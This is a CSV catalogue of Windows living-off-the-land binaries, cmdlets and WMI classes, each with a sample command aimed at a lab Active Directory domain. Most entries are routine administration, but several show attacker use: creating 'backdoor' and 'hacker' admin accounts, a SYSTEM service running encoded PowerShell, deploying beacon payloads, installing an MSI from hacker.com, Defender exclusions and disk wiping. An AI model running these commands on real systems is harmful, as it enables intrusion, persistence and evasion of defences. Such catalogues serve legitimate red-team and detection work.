Tools,Service,Port,Syntax & Description,Tags,MITRE ATT&CK
lusrmgr.msc,LOFLCab,,lusrmgr.msc /computer=W10.ad.bitsadmin.com - Local Users and Groups,"LOFLCab, LOTL (Living Off The Land)",
devmgmt.msc,LOFLCab,,compmgmt.msc - Device Manager,"LOFLCab, LOTL (Living Off The Land)",
Clear-Disk,LOFLCab,,"Clear-Disk -CimSession $s -Number 3 - Cleans a disk by removing all partition information and un-initializing it, erasing all data on the disk","LOFLCab, LOTL (Living Off The Land)",
Remove-NetNatStaticMapping,LOFLCab,,Remove-NetNatStaticMapping -CimSession $s - Removes static mappings from a NAT instance,"LOFLCab, LOTL (Living Off The Land)",
net.exe,LOFLCab,,"net.exe user backdoor Password1! /add /domain - Functionalities related to querying and modifying the domain, services, shares and users","LOFLCab, LOTL (Living Off The Land)",
psloggedon.exe,LOFLCab,,psloggedon.exe \\W10.ad.bitsadmin.com - See who's logged on,"LOFLCab, LOTL (Living Off The Land)",
Get-ADDomainController,LOFLCab,,"Get-ADDomainController -Discover -Service GlobalCatalog -DomainName ad.bitsadmin.com - Gets one or more Active Directory domain controllers based on discoverable services criteria, search parameters or by providing a domain controller identifier, such as the NetBIOS name","LOFLCab, LOTL (Living Off The Land)",
Remove-NetEventSession,LOFLCab,,Remove-NetEventSession -CimSession $s - Removes a network event session,"LOFLCab, LOTL (Living Off The Land)",
CIM_LogicalFile,LOFLCab,, - Represents a named collection of data located in a file system on a storage extent,"LOFLCab, LOTL (Living Off The Land)",
Start-DscConfiguration,LOFLCab,,Start-DscConfiguration -CimSession $s - Applies configuration to nodes,"LOFLCab, LOTL (Living Off The Land)",
Enter-PSSession,LOFLCab,,Enter-PSSession -Session $ps - Starts an interactive session with a remote computer,"LOFLCab, LOTL (Living Off The Land)",
Get-GPOReport,LOFLCab,,"Get-GPOReport -All -Domain ad.bitsadmin.com -Server DC1.ad.bitsadmin.com -ReportType Xml -Path ""$pwd\domain.xml"" - Generates a report either in XML or HTML format for a specified GPO or for all GPOs in a domain","LOFLCab, LOTL (Living Off The Land)",
adrestore.exe,LOFLCab,,adrestore.exe - Enumerates deleted (tombstoned) objects in a domain and gives you the option of restoring each one,"LOFLCab, LOTL (Living Off The Land)",
mstsc.exe,LOFLCab,,mstsc.exe /remoteGuard /v:SP2019.ad.bitsadmin.com - Connect to the desktop of remote computers,"LOFLCab, LOTL (Living Off The Land)",
iis.msc,LOFLCab,,iis.msc - Internet Information Services (IIS) Manager,"LOFLCab, LOTL (Living Off The Land)",
psfile.exe,LOFLCab,,psfile.exe -nobanner \\W10.ad.bitsadmin.com - Lists or closes files opened remotely,"LOFLCab, LOTL (Living Off The Land)",
Get-ScheduledTaskInfo,LOFLCab,,Get-ScheduledTaskInfo -CimSession $s -TaskName '\Microsoft\Windows\DiskCleanup\CleanupBackdoor' - Gets run-time information for a scheduled task,"LOFLCab, LOTL (Living Off The Land)",
Remove-NetNat,LOFLCab,,Remove-NetNat -CimSession $s - Removes NAT objects,"LOFLCab, LOTL (Living Off The Land)",
Clear-DnsClientCache,LOFLCab,,Clear-DnsClientCache -CimSession $s - Clears the contents of the DNS client cache,"LOFLCab, LOTL (Living Off The Land)",
New-ADComputer,LOFLCab,,"$account = 'MyComputer'
$password = 'Password1!'
$domain = 'ad.bitsadmin.com'
New-ADComputer -Name $account -SAMAccountName $account -AccountPassword (ConvertTo-SecureString $password -Force -AsPlainText) -Verbose -DNSHostName ""$account.$domain"" -ServicePrincipalNames @(""HOST/$account.$domain"",""RestrictedKrbHost/$account.$domain"",""HOST/$account"",""RestrictedKrbHost/$account"") - Creates a new Active Directory computer","LOFLCab, LOTL (Living Off The Land)",
Get-NfsShare,LOFLCab,,Get-NfsShare -CimSession $s - Gets NFS shares on an NFS server,"LOFLCab, LOTL (Living Off The Land)",
New-ADUser,LOFLCab,,"New-ADUser -Name ""Backdoor"" -AccountPassword (ConvertTo-SecureString ""MyPassword!"" -Force -AsPlainText) -Enabled $true - Creates a new Active Directory user","LOFLCab, LOTL (Living Off The Land)",
Show-EventLog,LOFLCab,,Show-EventLog -ComputerName W10.ad.bitsadmin.com - Displays the event logs of the local or a remote computer in Event Viewer,"LOFLCab, LOTL (Living Off The Land)",
Remove-SmbShare,LOFLCab,,Remove-SmbShare -CimSession $s - Deletes the specified SMB shares,"LOFLCab, LOTL (Living Off The Land)",
Win32_Environment,LOFLCab,,"New-CimInstance -ClassName Win32_Environment -Property @{Name=""PATH"";VariableValue=""C:\hackertools; C:\Windows\System32;C:\Windows"";UserName=""<SYSTEM>""} -CimSession $s - Represents an environment or system environment setting on a Windows computer system","LOFLCab, LOTL (Living Off The Land)",
regedit.exe,LOFLCab,,regedit.exe - Registry Editor,"LOFLCab, LOTL (Living Off The Land)",
Add-NetNatExternalAddress,LOFLCab,,Add-NetNatExternalAddress -CimSession $s - Adds an external address to a NAT instance,"LOFLCab, LOTL (Living Off The Land)",
dsac.exe,LOFLCab,,dsac.exe - Active Directory Administrative Center,"LOFLCab, LOTL (Living Off The Land)",
Get-MpThreatDetection,LOFLCab,,Get-MpThreatDetection -CimSession $s - Gets active and past malware threats that Windows Defender detected,"LOFLCab, LOTL (Living Off The Land)",
Get-NetUDPEndpoint,LOFLCab,,Get-NetUDPEndpoint -CimSession $s - Gets current UDP endpoint statistics,"LOFLCab, LOTL (Living Off The Land)",
Set-NetNat,LOFLCab,,Set-NetNat -CimSession $s - Modifies settings for NAT objects,"LOFLCab, LOTL (Living Off The Land)",
Win32_Product,LOFLCab,,"Get-CimInstance -ClassName Win32_Product -CimSession $s | Select-Object Caption,Vendor,Version,InstallLocation - Represent products as they are installed by MSI","LOFLCab, LOTL (Living Off The Land)",
w32tm.exe,LOFLCab,,w32tm.exe /query /computer:W10.ad.bitsadmin.com /status /verbose - Synchronize the date and time,"LOFLCab, LOTL (Living Off The Land)",
waitfor.exe,LOFLCab,,waitfor.exe - Sends or waits for a signal on a system,"LOFLCab, LOTL (Living Off The Land)",
Get-MpComputerStatus,LOFLCab,,Get-MpComputerStatus -CimSession $s - Gets the status of antimalware software on the computer,"LOFLCab, LOTL (Living Off The Land)",
Get-DhcpServerSetting,LOFLCab,,Get-DhcpServerSetting -CimSession $s - Gets the configuration parameters of the database of the Dynamic Host Configuration Protocol (DHCP) server service,"LOFLCab, LOTL (Living Off The Land)",
New-ADGroup,LOFLCab,,New-ADGroup - Creates an Active Directory group,"LOFLCab, LOTL (Living Off The Land)",
nfsmgmt.msc,LOFLCab,,nfsmgmt.msc - Services for NFS,"LOFLCab, LOTL (Living Off The Land)",
New-EtwTraceSession,LOFLCab,,New-EtwTraceSession -CimSession $s - Creates an ETW trace session,"LOFLCab, LOTL (Living Off The Land)",
New-CimSession,LOFLCab,,"$so = New-CimSessionOption -Protocol Dcom -Authentication Kerberos
$s = New-CimSession -ComputerName W10.ad.bitsadmin.com -SessionOption $so - Creates a CIM session","LOFLCab, LOTL (Living Off The Land)",
ospp.vbs,LOFLCab,,cscript.exe ospp.vbs W10.ad.bitsadmin.com /dstatusall - Configure volume licensed versions of Office products,"LOFLCab, LOTL (Living Off The Land)",
psinfo.exe,LOFLCab,,psinfo.exe \\W10.ad.bitsadmin.com - Local and remote system information viewer,"LOFLCab, LOTL (Living Off The Land)",
Remove-MpPreference,LOFLCab,,Remove-MpPreference -CimSession $s - Removes exclusions or default actions,"LOFLCab, LOTL (Living Off The Land)",
Win32_Service,LOFLCab,,"Get-CimInstance -Filter 'Name=""TermService""' -ClassName Win32_Service -CimSession $s - Represents a service on a computer system running Windows","LOFLCab, LOTL (Living Off The Land)",
msg.exe,LOFLCab,,msg.exe - Send a message to a user,"LOFLCab, LOTL (Living Off The Land)",
dsacls.exe,LOFLCab,,dsacls.exe - Displays or modifies permissions (ACLS) of an Active Directory Domain Services (AD DS) Object,"LOFLCab, LOTL (Living Off The Land)",
Win32_Service,LOFLCab,,"Invoke-WmiMethod -Class Win32_Service -Name Create -ArgumentList $false,""Print Spooler (x64)"",([byte]1),$null,$null,""spoolsv64"",""C:\Windows\System32\cmd.exe /c powershell -e bHM="",$null,([byte]16),""Manual"",""NT AUTHORITY\SYSTEM"","""" - Represents a service on a computer system running Windows","LOFLCab, LOTL (Living Off The Land)",
Get-DhcpServerDnsCredential,LOFLCab,,Get-DhcpServerDnsCredential -CimSession $s - Gets an account that the DHCP Server service uses to register or deregister client records on a DNS server,"LOFLCab, LOTL (Living Off The Land)",
logman.exe,LOFLCab,,logman.exe query providers -s W10.ad.bitsadmin.com - Creates and manages Event Trace Session and Performance logs and supports many functions of Performance Monitor from the command line,"LOFLCab, LOTL (Living Off The Land)",
Copy-Item,LOFLCab,,Copy-Item -Path C:\beacon.exe -Destination C:\Windows\System32\Explorer.exe -ToSession $ps - Copies an item from one location to another,"LOFLCab, LOTL (Living Off The Land)",
Close-SmbSession,LOFLCab,,Close-SmbSession -CimSession $s - Ends forcibly the SMB session,"LOFLCab, LOTL (Living Off The Land)",
slmgr.vbs,LOFLCab,,cscript.exe slmgr.vbs W10.ad.bitsadmin.com /dlv - Obtain volume activation information,"LOFLCab, LOTL (Living Off The Land)",
Set-DhcpServerAuditLog,LOFLCab,,Set-DhcpServerAuditLog -CimSession $s - Sets the Dynamic Host Configuration Protocol (DHCP) server service audit log configuration on the DHCP server service running on the computer,"LOFLCab, LOTL (Living Off The Land)",
Win32_ShadowCopy,LOFLCab,,"$r = Invoke-CimMethod -ClassName Win32_ShadowCopy -MethodName Create -Arguments @{Volume='C:\'} -CimSession $s
$r - Storage extent that represents a duplicate copy of the original volume at a previous time","LOFLCab, LOTL (Living Off The Land)",
Set-ADAccountPassword,LOFLCab,,"$old = ConvertTo-SecureString 'OldPassword1!' -A -F
$new = ConvertTo-SecureString 'NewPassword1!' -A -F
Set-ADAccountPassword -Identity MyAccount -OldPassword $old -NewPassword $new - Modifies the password of an Active Directory account","LOFLCab, LOTL (Living Off The Land)",
New-GPLink,LOFLCab,,"New-GPLink - Links a GPO to a site, domain, or OU","LOFLCab, LOTL (Living Off The Land)",
ocsp.msc,LOFLCab,,ocsp.msc /Computer:DC1.ad.bitsadmin.com - Online Responder Management,"LOFLCab, LOTL (Living Off The Land)",
dsget.exe,LOFLCab,,dsget.exe - Display the selected properties of a specific object in the directory,"LOFLCab, LOTL (Living Off The Land)",
CIM_Directory,LOFLCab,," - Type of file that logically groups data files 'contained' in it, and provides path information for the grouped files","LOFLCab, LOTL (Living Off The Land)",
winrs.exe,LOFLCab,,winrs.exe -r:W10.ad.bitsadmin.com cmd - Manage and execute programs remotely,"LOFLCab, LOTL (Living Off The Land)",
Get-DnsServer,LOFLCab,,Get-DnsServer -CimSession $s - Retrieves a DNS server configuration,"LOFLCab, LOTL (Living Off The Land)",
comexp.msc,LOFLCab,,comexp.msc - Component Services,"LOFLCab, LOTL (Living Off The Land)",
gpmc.msc,LOFLCab,,gpmc.msc /domain:ad.bitsadmin.com - Group Policy Management,"LOFLCab, LOTL (Living Off The Land)",
srvcheck.exe,LOFLCab,,srvcheck.exe \\DC1.ad.bitsadmin.com - Server share check,"LOFLCab, LOTL (Living Off The Land)",
Remove-VirtualDisk,LOFLCab,,Remove-VirtualDisk -CimSession $s - Deletes an existing virtual disk and reclaims the used space for use by other virtual disks in the same storage pool,"LOFLCab, LOTL (Living Off The Land)",
Register-CimIndicationEvent,LOFLCab,,Register-CimIndicationEvent -CimSession $s - Subscribes to indications using a filter expression or a query expression,"LOFLCab, LOTL (Living Off The Land)",
Get-ADUser,LOFLCab,,"Get-ADUser -Filter {ServicePrincipalName -ne ""$null""} -Properties ServicePrincipalName - Gets one or more Active Directory users","LOFLCab, LOTL (Living Off The Land)",
Get-DhcpServerInDC,LOFLCab,,Get-DhcpServerInDC -CimSession $s - Retrieves the list of authorized computers running the Dynamic Host Configuration Protocol (DHCP) server service from Active Directory (AD),"LOFLCab, LOTL (Living Off The Land)",
pspasswd.exe,LOFLCab,,pspasswd.exe \\W10.ad.bitsadmin.com MyUser MyNewPassword - Changes passwords on a local or remote system,"LOFLCab, LOTL (Living Off The Land)",
rwinsta.exe,LOFLCab,,rwinsta.exe 1 /SERVER:W10.ad.bitsadmin.com /V - Reset the session subsytem hardware and software to known initial values,"LOFLCab, LOTL (Living Off The Land)",
psexec.exe,LOFLCab,,"psexec.exe \\W10.ad.bitsadmin.com -s cmd.exe /c net user hacker hacker /add ^&^& net localgroup Administrators hacker /add - Executes a program on a remote system, where remotely executed console applications execute interactively","LOFLCab, LOTL (Living Off The Land)",
ipsecsnp.dll,LOFLCab,,mmc.exe - IP Security Policy Management,"LOFLCab, LOTL (Living Off The Land)",
ipsmsnap.dll,LOFLCab,,mmc.exe - IP Security Monitor,"LOFLCab, LOTL (Living Off The Land)",
Remove-ADUser,LOFLCab,,Remove-ADUser - Removes an Active Directory user,"LOFLCab, LOTL (Living Off The Land)",
Win32_ShadowCopy,LOFLCab,,"Get-CimInstance -ClassName Win32_ShadowCopy -CimSession $s -Filter ""ID=`""$($r.ShadowID)`"""" - Storage extent that represents a duplicate copy of the original volume at a previous time","LOFLCab, LOTL (Living Off The Land)",
New-ADOrganizationalUnit,LOFLCab,,"New-ADOrganizationalUnit -Name GPO_Test -Path ""OU=Azure,OU=Servers,DC=ad,DC=bitsadmin,DC=com"" - Creates a new Active Directory organizational unit","LOFLCab, LOTL (Living Off The Land)",
Get-DfsnFolder,LOFLCab,,Get-DfsnFolder -CimSession $s - Gets settings for a DFS namespace folder,"LOFLCab, LOTL (Living Off The Land)",
Get-NetIPAddress,LOFLCab,,"Get-NetIPAddress -CimSession $s | Sort InterfaceIndex | ft -Autosize InterfaceIndex, InterfaceAlias, AddressFamily, IPAddress, PrefixLength - Gets the IP address configuration","LOFLCab, LOTL (Living Off The Land)",
Get-Printer,LOFLCab,,Get-Printer -CimSession $s - Retrieves a list of printers installed on a computer,"LOFLCab, LOTL (Living Off The Land)",
Win32_Service,LOFLCab,,Get-CimInstance -ClassName Win32_Service -CimSession $s - Represents a service on a computer system running Windows,"LOFLCab, LOTL (Living Off The Land)",
tsadmin.msc,LOFLCab,,tsadmin.msc - Remote Desktop Services Manager,"LOFLCab, LOTL (Living Off The Land)",
query.exe,LOFLCab,,"query.exe user /server:W10.ad.bitsadmin.com - Displays information about processes, sessions, and Remote Desktop Session Host servers","LOFLCab, LOTL (Living Off The Land)",
Invoke-CimMethod,LOFLCab,,"Invoke-CimMethod -ClassName StdRegProv -MethodName SetDWORDValue -Arguments @{hDefKey=[uint32]2147483650; sSubKeyName=""Software\Policies\Microsoft\Windows NT\Terminal Services""; sValueName=""Shadow""; uValue=[uint32]2} -CimSession $s - Invokes a method of a CIM class","LOFLCab, LOTL (Living Off The Land)",
tapimgmt.msc,LOFLCab,,tapimgmt.msc - Telephony,"LOFLCab, LOTL (Living Off The Land)",
gptedit.msc,LOFLCab,,"gptedit.msc /s /gtmpobject:""\\DC1.ad.bitsadmin.com\sysvol\ad.bitsadmin.com\StarterGPOs\{DE3EB8C2-A808-4509-9D89-D383F950AEDB}\"" - Group Policy Starter GPO Editor","LOFLCab, LOTL (Living Off The Land)",
Test-Connection,LOFLCab,,"Test-Connection DC1.ad.bitsadmin.com - Sends ICMP echo request packets, or pings, to one or more computers.","LOFLCab, LOTL (Living Off The Land)",
pubprn.vbs,LOFLCab,,cscript pubprn.vbs - Publishes a printer to the Active Directory Domain Services,"LOFLCab, LOTL (Living Off The Land)",
perfmon.msc,LOFLCab,,perfmon.msc - Performance Monitor,"LOFLCab, LOTL (Living Off The Land)",
dsmove.exe,LOFLCab,,dsmove.exe - Moves or renames an object within the directory,"LOFLCab, LOTL (Living Off The Land)",
Get-NetTCPConnection,LOFLCab,,Get-NetTCPConnection -CimSession $s -State Established - Gets TCP connections,"LOFLCab, LOTL (Living Off The Land)",
New-NetEventSession,LOFLCab,,"New-NetEventSession -Name sess -CimSession $s -LocalFilePath ""C:\Windows\Temp\Trace.etl"" -CaptureMode SaveToFile
Add-NetEventPacketCaptureProvider -SessionName sess -CimSession $s -Level 4 -CaptureType Physical
Start-NetEventSession -Name sess -CimSession $s
Get-NetEventSession -Name sess -CimSession $s

Stop-NetEventSession -Name sess -CimSession $s
Remove-NetEventSession -Name sess -CimSession $s
Move-Item \\DC1.ad.bitsadmin.com\C$\Windows\Temp\Trace.etl C:\tmp - Creates a network event session","LOFLCab, LOTL (Living Off The Land)",
Get-CimInstance,LOFLCab,,Get-CimInstance -CimSession $s -ClassName Win32_Process - Gets the CIM instances of a class from a CIM server,"LOFLCab, LOTL (Living Off The Land)",
Write-EventLog,LOFLCab,,Write-EventLog - Writes an event to an event log.,"LOFLCab, LOTL (Living Off The Land)",
netdom.exe,LOFLCab,,netdom.exe join %computername% /domain:ad.bitsadmin.com - Manage Active Directory domains and trust relationships from the command prompt,"LOFLCab, LOTL (Living Off The Land)",
WmiMgmt.msc,LOFLCab,,WmiMgmt.msc - WMI Control,"LOFLCab, LOTL (Living Off The Land)",
dsadd.exe,LOFLCab,,dsadd.exe - Add specific types of objects to the directory,"LOFLCab, LOTL (Living Off The Land)",
Get-GPO,LOFLCab,,Get-GPO - Gets one GPO or all the GPOs in a domain,"LOFLCab, LOTL (Living Off The Land)",
azman.msc,LOFLCab,,azman.msc - Authorization Manager,"LOFLCab, LOTL (Living Off The Land)",
Add-MpPreference,LOFLCab,,Add-MpPreference -ExclusionPath 'C:\EvilTools' -CimSession $s - Modifies settings for Windows Defender,"LOFLCab, LOTL (Living Off The Land)",
Get-GPOReport,LOFLCab,,"Get-GPOReport -All -Domain ad.bitsadmin.com -Server DC1.ad.bitsadmin.com -ReportType Html -Path ""$pwd\domain.html"" - Generates a report either in XML or HTML format for a specified GPO or for all GPOs in a domain","LOFLCab, LOTL (Living Off The Land)",
query.exe,LOFLCab,,"query.exe session /server:W10.ad.bitsadmin.com - Displays information about processes, sessions, and Remote Desktop Session Host servers","LOFLCab, LOTL (Living Off The Land)",
nltest.exe,LOFLCab,,"nltest.exe /SHUTDOWN:"""" 0 /SERVER:W10.ad.bitsadmin.com - Perform network administrative tasks","LOFLCab, LOTL (Living Off The Land)",
New-SmbShare,LOFLCab,,New-SmbShare -CimSession $s - Creates an SMB share,"LOFLCab, LOTL (Living Off The Land)",
rrasmgmt.msc,LOFLCab,,rrasmgmt.msc /ComputerName DC1.ad.bitsadmin.com - Routing and Remote Access,"LOFLCab, LOTL (Living Off The Land)",
winrm.cmd,LOFLCab,,winrm.vbs get wmicimv2/Win32_Process?Handle=3456 -r:W10.ad.bitsadmin.com - Windows Remote Management,"LOFLCab, LOTL (Living Off The Land)",
Get-RemoteAccess,LOFLCab,,Get-RemoteAccess -CimSession $s - Displays the configuration of DirectAccess (DA) and VPN (both Remote Access VPN and site-to-site VPN),"LOFLCab, LOTL (Living Off The Land)",
sqlcmd.exe,LOFLCab,,"sqlcmd.exe -S SQL1.ad.bitsadmin.com\SQLEXPRESS - Integrated environment for managing any SQL infrastructure, from SQL Server to Azure SQL Database","LOFLCab, LOTL (Living Off The Land)",
diskmgmt.msc,LOFLCab,,compmgmt.msc - Disk Management,"LOFLCab, LOTL (Living Off The Land)",
Test-NetConnection,LOFLCab,,Test-NetConnection - Displays diagnostic information for a connection,"LOFLCab, LOTL (Living Off The Land)",
MSFT_DNSClientCache,LOFLCab,,Get-CimInstance -Namespace ROOT\StandardCimv2 -ClassName MSFT_DNSClientCache -CimSession $s - Represents a record in a DNS client cache,"LOFLCab, LOTL (Living Off The Land)",
Get-EtwTraceSession,LOFLCab,,Get-EtwTraceSession -CimSession $s - Gets ETW trace sessions,"LOFLCab, LOTL (Living Off The Land)",
pslist.exe,LOFLCab,,pslist.exe -nobanner \\W10.ad.bitsadmin.com - Process information lister,"LOFLCab, LOTL (Living Off The Land)",
SQLServerManager15.msc,LOFLCab,,SQLServerManager15.msc /computer:SQL1.ad.bitsadmin.com - SQL Server 2019 Configuration Manager,"LOFLCab, LOTL (Living Off The Land)",
Get-CimInstance,LOFLCab,,Get-CimInstance -ClassName Win32_Process | % { [PSCustomObject]@{Name=$_.Name; User=$(Invoke-CimMethod -InputObject $_ -MethodName GetOwner).User } } - Gets the CIM instances of a class from a CIM server,"LOFLCab, LOTL (Living Off The Land)",
gpfixup.exe,LOFLCab,,gpfixup.exe - Group Policy fix up utility,"LOFLCab, LOTL (Living Off The Land)",
Get-ADComputer,LOFLCab,,"Get-ADComputer -Filter 'OperatingSystem -like ""*Server 2008*""' -Properties OperatingSystem - Gets one or more Active Directory computers","LOFLCab, LOTL (Living Off The Land)",
Unregister-ScheduledTask,LOFLCab,,Unregister-ScheduledTask -CimSession $s Backdoor -Confirm:$false - Unregisters a scheduled task,"LOFLCab, LOTL (Living Off The Land)",
dnscmd.exe,LOFLCab,,dnscmd.exe - Command-line interface for managing DNS servers,"LOFLCab, LOTL (Living Off The Land)",
Get-GPPermission,LOFLCab,,Get-GPPermission - Gets the permission level for one or more security principals on a specified GPO,"LOFLCab, LOTL (Living Off The Land)",
Get-NetNatStaticMapping,LOFLCab,,Get-NetNatStaticMapping -CimSession $s - Gets static mappings configured on NAT instances,"LOFLCab, LOTL (Living Off The Land)",
Get-DnsServerCache,LOFLCab,,Get-DnsServerCache -CimSession $s - Retrieves DNS server cache settings,"LOFLCab, LOTL (Living Off The Land)",
dsquery.exe,LOFLCab,,"dsquery.exe - This tool's commands suite allow you to query the directory according to specified criteria. Each of the following dsquery commands finds objects of a specific object type, with the exception of dsquery *, which can query for any type of object","LOFLCab, LOTL (Living Off The Land)",
Set-ADAccountPassword,LOFLCab,,"$new = ConvertTo-SecureString 'NewPassword1!' -A -F
Set-ADAccountPassword -Identity MyAccount -Reset -NewPassword $new - Modifies the password of an Active Directory account","LOFLCab, LOTL (Living Off The Land)",
eventvwr.msc,LOFLCab,,eventvwr.exe DC1.ad.bitsadmin.com - Event Viewer,"LOFLCab, LOTL (Living Off The Land)",
Get-MpThreatCatalog,LOFLCab,,Get-MpThreatCatalog -CimSession $s - Gets known threats from the definitions catalog,"LOFLCab, LOTL (Living Off The Land)",
Disable-ADAccount,LOFLCab,,Disable-ADAccount -Identity Hacker - Disables an Active Directory account,"LOFLCab, LOTL (Living Off The Land)",
Get-ADObject,LOFLCab,,"Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne ""$null""} -Properties msDS-AllowedToDelegateTo, userAccountControl - Gets one or more Active Directory objects","LOFLCab, LOTL (Living Off The Land)",
Get-DnsClientNrptRule,LOFLCab,,Get-DnsClientNrptRule -CimSession $s - Retrieves the DNS client NRPT rules,"LOFLCab, LOTL (Living Off The Land)",
netsh.exe,LOFLCab,,"netsh.exe -r W10.ad.bitsadmin.com advfirewall firewall show rule name=""Remote Desktop - Shadow (TCP-In)"" - Display or modify the network configuration","LOFLCab, LOTL (Living Off The Land)",
Get-DfsnRoot,LOFLCab,,Get-DfsnRoot -CimSession $s - Gets settings for DFS namespaces,"LOFLCab, LOTL (Living Off The Land)",
regini.exe,LOFLCab,,regini.exe -m \\W10.ad.bitsadmin.com mybackdoor.ini - Modifies the registry from the command line or a script,"LOFLCab, LOTL (Living Off The Land)",
cusrmgr.exe,LOFLCab,,cusrmgr.exe -u TargetUser -P Password1! -m \\W10.ad.bitsadmin.com - Manage local user accounts,"LOFLCab, LOTL (Living Off The Land)",
New-PSSession,LOFLCab,,$ps = New-PSSession -ConfigurationName Microsoft.Exchange -ConnectionUri http://exch2019.ad.bitsadmin.com/PowerShell/ -Authentication Kerberos - Creates a persistent connection to a local or remote computer,"LOFLCab, LOTL (Living Off The Land)",
Enter-PSSession,LOFLCab,,Enter-PSSession -ComputerName W10.ad.bitsadmin.com - Starts an interactive session with a remote computer,"LOFLCab, LOTL (Living Off The Land)",
CIM_DataFile,LOFLCab,,"Get-CimInstance -Query ""Select * from CIM_DataFile Where ((Drive = 'C:') AND (FileName = 'ntuser') AND (Extension = 'dat'))"" -CimSession $s - Type of logical file that is a named collection of data or executable code","LOFLCab, LOTL (Living Off The Land)",
Get-CimAssociatedInstance,LOFLCab,,Get-CimAssociatedInstance -CimSession $s - Retrieves the CIM instances that are connected to a specific CIM instance by an association,"LOFLCab, LOTL (Living Off The Land)",
dsrm.exe,LOFLCab,,dsrm.exe - Deletes objects from the directory,"LOFLCab, LOTL (Living Off The Land)",
typeperf.exe,LOFLCab,,"typeperf.exe ""\\W10.ad.bitsadmin.com\Processor(0)\% User Time"" - Writes performance data to the command window or to a log file","LOFLCab, LOTL (Living Off The Land)",
Invoke-WSManAction,LOFLCab,,"Invoke-WSManAction -ComputerName W10.ad.bitsadmin.com -Action ""Create"" -ResourceURI wmicimv2/win32_process -ValueSet @{CommandLine='C:\Windows\System32\rundll32.exe ""C:\tmp\App Folder\beacon.dll"",Start'} - Invokes an action on the object that is specified by the Resource URI and by the selectors","LOFLCab, LOTL (Living Off The Land)",
Get-ADForest,LOFLCab,,Get-ADForest -Server ad.bitsadmin.com - Gets an Active Directory forest,"LOFLCab, LOTL (Living Off The Land)",
djoin.exe,LOFLCab,,djoin.exe /PROVISION /DOMAIN ad.bitsadmin.com /MACHINE hacker /SAVEFILE hacker.txt /DEFPWD /PRINTBLOB /NETBIOS hacker - Provision a computer account in the domain,"LOFLCab, LOTL (Living Off The Land)",
local.exe,LOFLCab,,local.exe Administrators \\W10.ad.bitsadmin.com - Displays members of local groups on remote servers or domains,"LOFLCab, LOTL (Living Off The Land)",
qprocess.exe,LOFLCab,,qprocess.exe /server:W10.ad.bitsadmin.com DomainUser2 - Displays information about processes that are running on a Remote Desktop Session Host server,"LOFLCab, LOTL (Living Off The Land)",
sc.exe,LOFLCab,,sc.exe \\W10.ad.bitsadmin.com config wuauserv start= disabled - Interact with the Service Control Manager database,"LOFLCab, LOTL (Living Off The Land)",
Get-Service,LOFLCab,,Get-Service -ComputerName W10.ad.bitsadmin.com - Gets the services on a local or remote computer,"LOFLCab, LOTL (Living Off The Land)",
Get-GPOReport,LOFLCab,,Get-GPOReport - Generates a report either in XML or HTML format for a specified GPO or for all GPOs in a domain,"LOFLCab, LOTL (Living Off The Land)",
Win32_Product,LOFLCab,,"Invoke-CimMethod -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation=""https://hacker.com/backdoor.msi""; Options=""""; AllUsers=$true} -CimSession $s - Represent products as they are installed by MSI","LOFLCab, LOTL (Living Off The Land)",
Get-DnsClientCache,LOFLCab,,Get-DnsClientCache -CimSession $s - Retrieves the contents of the DNS client cache,"LOFLCab, LOTL (Living Off The Land)",
Set-NetConnectionProfile,LOFLCab,,Set-NetConnectionProfile -CimSession $s -InterfaceAlias 'Ethernet0' -NetworkCategory Private - Changes the network category of a connection profile,"LOFLCab, LOTL (Living Off The Land)",
reg.exe,LOFLCab,,"reg.exe query ""\\W10.ad.bitsadmin.com\HKLM\Software\Microsoft\Windows\CurrentVersion\Run"" - Query and edit the registry","LOFLCab, LOTL (Living Off The Land)",
qwinsta.exe,LOFLCab,,qwinsta.exe /server:W10.ad.bitsadmin.com - Display information about Remote Desktop Services sessions,"LOFLCab, LOTL (Living Off The Land)",
Close-SmbOpenFile,LOFLCab,,Close-SmbOpenFile -CimSession $s - Closes a file that is open by one of the clients of the SMB server,"LOFLCab, LOTL (Living Off The Land)",
Disable-NetAdapter,LOFLCab,,Disable-NetAdapter -Name Ethernet0 -CimSession $s - Disables a network adapter,"LOFLCab, LOTL (Living Off The Land)",
secpol.msc,LOFLCab,,gpedit.msc - Local Security Policy,"LOFLCab, LOTL (Living Off The Land)",
dsmod.exe,LOFLCab,,dsmod.exe - Modifies existing objects in the directory,"LOFLCab, LOTL (Living Off The Land)",
